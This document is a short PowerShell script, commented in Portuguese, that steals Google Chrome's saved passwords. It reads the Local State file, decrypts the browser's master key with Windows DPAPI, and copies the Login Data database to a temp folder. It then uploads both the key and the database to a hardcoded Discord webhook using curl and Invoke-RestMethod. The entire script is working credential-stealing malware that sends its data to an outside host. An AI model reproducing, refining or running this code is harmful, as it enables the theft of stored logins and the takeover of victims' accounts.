$Webhook = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

# 1. CARREGA A BIBLIOTECA DE SEGURANÇA (Isso resolve o erro TypeNotFound)
Add-Type -AssemblyName System.Security.Cryptography

function Get-ChromePasswords {
    $LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $TempLoginData = "$env:TEMP\L.db"

    if (-not (Test-Path $LocalState)) { return "Erro: Chrome nao encontrado." }

    try {
        # 2. Pega e descriptografa a Master Key
        $JSON = Get-Content $LocalState -Raw | ConvertFrom-Json
        $Key = [Convert]::FromBase64String($JSON.os_crypt.encrypted_key)[5..255]
        $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($Key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        # 3. Copia o banco para o TEMP para nao travar se o Chrome estiver aberto
        Copy-Item $LoginData $TempLoginData -Force

        # 4. Envia o arquivo de banco de dados e a Chave Mestra (em Base64)
        $KeyBase64 = [Convert]::ToBase64String($MasterKey)
        
        # Envia a chave primeiro para você saber qual usar
        curl.exe -F "content=Chave Mestra (Base64): $KeyBase64" $Webhook
        
        # Envia o arquivo do banco de dados
        curl.exe -F "file=@$TempLoginData" $Webhook
        
        return "Sucesso: Chave e Banco enviados!"
    } catch {
        return "Erro durante a execucao: $($_.Exception.Message)"
    }
}

$Result = Get-ChromePasswords

# Envio simples para evitar erro de JSON
$Body = @{ content = $Result } | ConvertTo-Json
Invoke-RestMethod -Uri $Webhook -Method Post -Body $Body -ContentType 'application/json'
